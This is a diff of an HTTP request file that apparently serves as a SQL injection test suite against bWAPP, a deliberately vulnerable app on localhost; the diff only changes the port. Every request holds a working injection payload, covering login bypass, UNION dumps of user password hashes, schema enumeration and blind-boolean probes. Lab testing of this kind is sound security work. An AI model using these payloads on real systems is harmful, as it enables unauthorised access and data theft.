@@ -23,7 +23,7 @@
 ###   Payload: ' OR 1=1-- -
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/sqli_1.php?title=%27%20OR%201%3D1--%20-&action=go HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 ### Expected: 200, all 9 movies listed (G.I. Joe ... World War Z)
 ###   URL-decoded: /sqli_1.php?title=' OR 1=1-- -&action=go
@@ -35,7 +35,7 @@ Cookie: {{authCookie}}
 ###   different number of columns". That error message is the enumeration oracle.
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/sqli_1.php?title=%27%20UNION%20SELECT%201%2C2%2C3%2C4%2C5%2C6--%20-&action=go HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 ### Expected: 200, an extra row rendered from our SELECT
 
@@ -48,7 +48,7 @@ Cookie: {{authCookie}}
 ###   FIRST row, so a plain UNION would only ever show users.id = 1.
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/sqli_2.php?movie=0%20UNION%20SELECT%201%2CGROUP_CONCAT(login)%2CGROUP_CONCAT(password)%2C4%2C5%2C6%20FROM%20users--%20-&action=go HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 ### Expected: 200, Title column = "A.I.M.,bee"
 ###           Release column = "6885858486f31043e5839c735d99457f045affd0,688585..."
@@ -59,7 +59,7 @@ Cookie: {{authCookie}}
 ### SQLI-04  Error/context based: leak the current database name
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/sqli_2.php?movie=0%20UNION%20SELECT%201%2Cdatabase()%2C3%2C4%2C5%2C6--%20-&action=go HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 ### Expected: 200, Title column = "bWAPP"
 
@@ -68,7 +68,7 @@ Cookie: {{authCookie}}
 ### SQLI-05  Enumerate the schema from information_schema
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/sqli_2.php?movie=0%20UNION%20SELECT%201%2CGROUP_CONCAT(table_name)%2C3%2C4%2C5%2C6%20FROM%20information_schema.tables%20WHERE%20table_schema%3Ddatabase()--%20-&action=go HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 ### Expected: 200, Title column contains "blog,heroes,movies,users"
 
@@ -79,7 +79,7 @@ Cookie: {{authCookie}}
 ###   exist", which is a clean boolean oracle for a scripted extractor.
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/sqli_4.php?title=%27%20OR%20%271%27%3D%271&action=search HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 ### Expected: 200, body contains "The movie exists in our database!"
 
@@ -88,7 +88,7 @@ Cookie: {{authCookie}}
 ### SQLI-07  Boolean blind - FALSE branch (control, proves the oracle is real)
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/sqli_4.php?title=%27%20OR%20%271%27%3D%270&action=search HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 ### Expected: 200, body contains "The movie does not exist in our database!"
 
@@ -97,7 +97,7 @@ Cookie: {{authCookie}}
 ### SQLI-08  POST LIKE search (sqli_6.php)
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/sqli_6.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
@@ -110,7 +110,7 @@ title=%27%20OR%201%3D1--%20-&form=submit
 ###   LIMIT 1 matters: the page renders one row, and we want the first.
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/sqli_3.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
@@ -123,7 +123,7 @@ login=%27%20OR%201%3D1%20LIMIT%201--%20-&password=x&form=submit
 ###   Bypasses authentication AND discloses the session's secret value.
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/sqli_16.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
@@ -137,7 +137,7 @@ login=%27%20OR%201%3D1%20LIMIT%201--%20-&password=x&form=submit
 ###   sink, so filters that only look at HTML can miss it.
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/sqli_10-2.php?title=%27%20UNION%20SELECT%201%2C2%2C3%2C4%2C5%2C6--%20- HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 ### Expected: 200 Content-Type: text/json, keys title/release_year/main_character/genre/imdb
 
@@ -147,7 +147,7 @@ Cookie: {{authCookie}}
 ###   The entry is concatenated into an INSERT; the subquery replaces owner.
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/sqli_7.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
@@ -162,7 +162,7 @@ entry=x%27%2C(SELECT%20login%20FROM%20users%20LIMIT%201)%2C%272024-01-01%27%2C%2
 ###   Reproduce the exact request the browser makes.
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/sqli_8-2.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Type: text/xml; charset=UTF-8
 
@@ -176,7 +176,7 @@ Content-Type: text/xml; charset=UTF-8
 ###   this is the working, non-erroring boolean form.
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/sqli_8-2.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Type: text/xml; charset=UTF-8
 
@@ -192,7 +192,7 @@ Content-Type: text/xml; charset=UTF-8
 ###   login.php is the one login form that is NOT injectable.
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/login.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Content-Type: application/x-www-form-urlencoded
 
 login=bee%27%20OR%20%271%27%3D%271&password=x&security_level=0&form=submit
